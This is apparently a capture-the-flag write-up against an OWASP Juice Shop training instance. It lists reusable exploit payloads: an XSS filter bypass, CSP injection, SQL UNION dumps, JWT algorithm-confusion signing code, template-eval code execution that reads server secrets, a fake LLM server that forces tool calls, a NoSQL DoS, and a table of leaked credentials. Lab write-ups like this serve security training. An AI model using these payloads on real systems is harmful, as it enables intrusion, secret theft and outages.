**Approach:** use the `#{...}` username eval to start an *in-process* `http` server on `127.0.0.1:11434` (no child process — `child_process.spawn`/`exec` reliably 502s/restarts the pod, and `/tmp` is not writable; the uploads dir is). The fake model returns an SSE `tool_calls` chunk invoking `generateCoupon` with `{"discount":50}` (→ Prompt Injection ≥10 and Greedy ≥50) and emits a `tool-call` event (→ AI Debugging with the `show_tool_calls=true` cookie + non-admin token). The file-write side of the eval (to `/juice-shop/frontend/dist/frontend/assets/public/images/uploads/`) was verified working (`step1.txt` → `ok`).

**Outcome:** the deploy succeeded once (`GET /profile` → 200 with the server created), but the instance then entered a sustained **`instance-restarting`** loop (`/api/Challenges/` → `302 → /multi-juicer/?msg=instance-restarting`), wiping users back to the 24-user seed and killing both the in-memory auth store and the in-process server before `/rest/chat` could complete. Conclusion: the three AI challenges are *technically* reachable via this bridge, but the current blocker is **instance stability**, not the LLM itself.

---

## Reusable Exploit Primitives

Techniques worth keeping — each was derived and verified against this instance.

### 1. Defeating `sanitizeLegacy` with a self-reassembling payload
The filter is a single global `replace` of `/<(?:\w+)\W+?[\w]/gi` — it eats `<tag` plus its following non-word run plus one word character. Prefixing a decoy does *not* help (the payload's own `<iframe s` is still eaten). The trick is to make the **removed span** straddle a duplicated character so the survivors reassemble into the exact payload:

```
<<a>iiframe src="javascript:alert(`xss`)">   ->  <iframe src="javascript:alert(`xss`)">
<<a>sscript>alert(`xss`)</script>           ->  <script>alert(`xss`)</script>
```
The leading `<` is skipped (next char is `<`, not `\w`), `<a>i` / `<a>s` is consumed, and nothing after it matches.

### 2. CSP injection through the profile image URL
`routes/userProfile.ts` builds the header as `` `img-src 'self' ${user.profileImage}; script-src 'self'` `` and solves **CSP Bypass** only when `profileImage` matches `/;[ ]*script-src(.)*'unsafe-inline'/`. Setting the image URL to

```
https://placehold.co/100.png; script-src 'unsafe-inline'
```
injects a second, permissive `script-src` into the emitted CSP. Combine with the username payload from (1).

### 3. GDPR data theft via vowel-mask collision
`routes/dataExport.ts` looks orders up by `email.replace(/[aeiou]/gi,'*')`. Any account whose **masked** email collides with the victim's inherits their orders:

```
admin@juice-sh.op  ->  *dm*n@j**c*-sh.*p
edmen@jaace-sh.ep  ->  *dm*n@j**c*-sh.*p   <- register this
```
The export is gated by an image CAPTCHA, whose plaintext answer is readable through the existing SQLi:
`x')) UNION SELECT id,answer,image,4,5,6,7,8,9 FROM ImageCaptchas ORDER BY id DESC--`

### 4. JWT algorithm confusion
`/encryptionkeys/jwt.pub` is world-readable. Signing **HS256 with the raw public-key file bytes as the HMAC secret** is accepted. PyJWT refuses this on purpose, so build it by hand:

```python
sig = hmac.new(open('jwt.pub','rb').read(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
```

### 5. Forging a continue code
Progress codes are Hashids with salt `this is my salt`, min length 60, alphabet `a-zA-Z0-9`. Encoding `999` and `PUT`-ing it to `/rest/continue-code/apply/<code>` solves *Imaginary Challenge* without touching any other challenge's state.

### 6. Talking Socket.IO without a client library
`python-socketio` failed namespace negotiation against this proxy. The raw polling handshake works and is enough to emit verifier events:

```
GET  /socket.io/?EIO=4&transport=polling            -> {"sid":...}
POST /socket.io/?EIO=4&transport=polling&sid=<sid>  body: 40
POST /socket.io/?EIO=4&transport=polling&sid=<sid>  body: 42["<event>","<data>"]
```

### 7. SSTi as a host-introspection oracle
The `#{...}` username eval is not just a challenge trigger — it is a general read primitive for the server process. The eval result is substituted into the rendered page, so the value can be read straight back out:

```
POST /profile   username=#{JSON.stringify(process.env.ALCHEMY_API_KEY||'<UNSET>')}
GET  /profile   -> value appears in the profile <p> block
```
This is how the Web3 blocker above was confirmed. It succeeds where XXE fails: `/proc/self/environ` is NUL-separated and libxml2 aborts with `Invalid character: Char 0x0 out of allowed range`, whereas the eval path returns clean JavaScript values. Note the eval result is **not** persisted to the DB — it must be scraped from the rendered response.

### 8. Reading server files
Two independent primitives: XXE via `/file-upload` (`.xml`, echoes the parsed doc back in the 410 error, truncated to 400 chars, and breaks on files containing `&` or `<`) and the GDPR `/dataerasure` `layout` hijack (100-char preview). Neither gives full-file reads — for bulk source review, cross-reference the pinned upstream release instead.

### 9. Solving all coding challenges offline
The `/snippets` endpoints are unauthenticated and entirely deterministic. `vulnLines` per key are derived from the `// vuln-code-snippet` markers in the pinned source (replay `lib/codingChallenges.ts`), and the correct fix index is the `_correct`-suffixed file in `data/static/codefixes/` (or just brute-force `selectedFix`). This clears all 70 coding challenges without touching the LLM or blockchain — see "Coding Challenges (find-it / fix-it)".

---

## Key Credentials, Hashes & Data Points

| Entity | Value | Use |
| :--- | :--- | :--- |
| Admin SQLi | `email=admin@juice-sh.op'--` | admin session (bid 1) |
| Exposed test account | `testing@juice-sh.op` / `IamUsedForTesting` (admin) | Exposed Credentials |
| J12934 (leaked logs) | `0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB` | Leaked Access Logs |
| Support team | `J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P` | Login Support Team |
| HMAC key (answers) | `pa4qacea4VK9t9nGv7yZtwmj` (static) | verify stored answer hashes |
| John geo answer | `Daniel Boone National Forest` | reset john@juice-sh.op |
| Emma geo answer | `ITsec` | reset emma@juice-sh.op |
| Reset answers | jim=`Samuel`; bjoern@owasp.org=`Zaya`; bender=`Stop'n'Drop`; uvogin=`Silence of the Lambs`; bjoern@juice-sh.op=`West-2082`; morty=`5N0wb41L` | reset challenges |
| CSAF checksum | `7e7ce7c6...42e843` (see earlier section) | Security Advisory |
| Vulnerable infra | `mongo` + `4.4.29` | Vulnerable Infrastructure |
| Leaked API key | `6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie` | Leaked API Key |
| Admin MD5 | `0192023a7bbd73250516f069df18b500` | Weird Crypto |
| SSRF/SSTi solve key | `tRy_H4rd3r_n0thIng_iS_Imp0ssibl3` | `/solve/challenges/server-side?key=...` |
| Profile-username eval trigger | username containing `#{...}` | SSTi flag |
| XSS payloads | `<iframe src="javascript:alert(\`xss\`)">`, `<script>alert(\`xss\`)</script>` | DOM/Reflected/username XSS |
| Product search columns | 9 | UNION shape |
| Users-username sanitizer | `sanitizeLegacy`: `/<(?:\w+)\W+?[\w]/gi` | CSP Bypass (username). Note: Client-side XSS Protection is checked on the **email** field, which is not sanitized at all. |

---

## Tooling Used

* `curl`, `jq`, Python `urllib` — API testing, token handling, body files (avoid shell-quoting mangling of payloads).
* `playwright-core` (Node) + system Chromium headless — SPA routes, DOM XSS, localStorage token injection.
* `socket.io-client` — direct Socket.IO events (Mass Dispel); needs `multi-juicer` cookie + `polling` transport.
* `exiftool` — EXIF/GPS (Meta Geo Stalking).
* UNION SQL + SQLite — schema/SecurityAnswers/user-data dump.
* Zip-slip (Python `zipfile`), YAML alias bomb, XML entity payloads — `/file-upload`.
* Shallow sparse clone of `juice-shop/juice-shop` — seed data, config, challenge-verifier source (`routes/*.ts`, `models/*.ts`, `config/*.yml`) to drive exploitation precisely.

---

## Operational Notes & Lessons

1. **Instance access** — always send the `multi-juicer` cookie; otherwise 302 to `/multi-juicer`.
2. **Auth split** — Bearer vs `token` cookie vs `localStorage`; in-memory auth store is flushed on instance restarts (re-login after any restart before `cookie`-based routes).
3. **Instance stability** — Mongo `sleep()` NoSQL DoS crashed/restarted the instance once, because `$where` runs per document and the delay multiplies; use a small per-document sleep (`sleep(80)`) to clear the 2 s threshold without hanging the pod. Sandboxed DoS variants (notevil infinite loop, vm YAML/libxml2 timeouts) are handled gracefully (503) and are safe. **All solves persisted across the restart.**
4. **Payload handling** — shell double-quote context executes backticks; always send XSS/SSTi payloads via body files or single quotes.
5. **Anti-cheat** — "inform the shop" verifiers compare text against source; phrase complaints naturally.
6. **Multi-user** — instance is shared with concurrent teammates; always re-read `/api/Challenges/` before re-attempting.
7. **AI/Web3 blockers** — the remaining 5 challenges are not solvable through the HTTP API alone: the 2 Web3 challenges need `ALCHEMY_API_KEY` configured server-side (their solve flags are set only from real on-chain events), and the 3 AI challenges need a working endpoint at `chatBot.llmApiUrl`. Both were confirmed blocked at the deployment level; see the "Remaining / Blocked" section.
8. **Instance stability (restart loop)** — during the final session the instance repeatedly entered `instance-restarting` (`302 → /multi-juicer/?msg=instance-restarting`), wiping user accounts back to the 24-user seed and clearing the in-memory auth store + any in-process state (e.g. a fake LLM). Residual teammate DoS/RCE activity is the likely cause. Re-verify health via `/api/Challenges/` before relying on `cookie`-based routes, and re-login after every restart.
9. **RCE is a general oracle, not just a flag** — the SSTi `#{...}` eval reads arbitrary config/env (`llmApiUrl`, `ALCHEMY_API_KEY`, `model`), confirmed LAN egress via the profile-image fetch primitive, and could in principle host services inside the pod. Use it for recon; avoid child-process spawning (crashes the pod).
10. **Coding challenges ≠ CTF score** — the score-board total (186) includes 70 code-snippet challenges (35 find-it + 35 fix-it) tracked via `codingChallengeStatus`, which the MultiJuicer score does **not** count. Solvable in bulk via the unauthenticated `/snippets` endpoints (see "Coding Challenges").
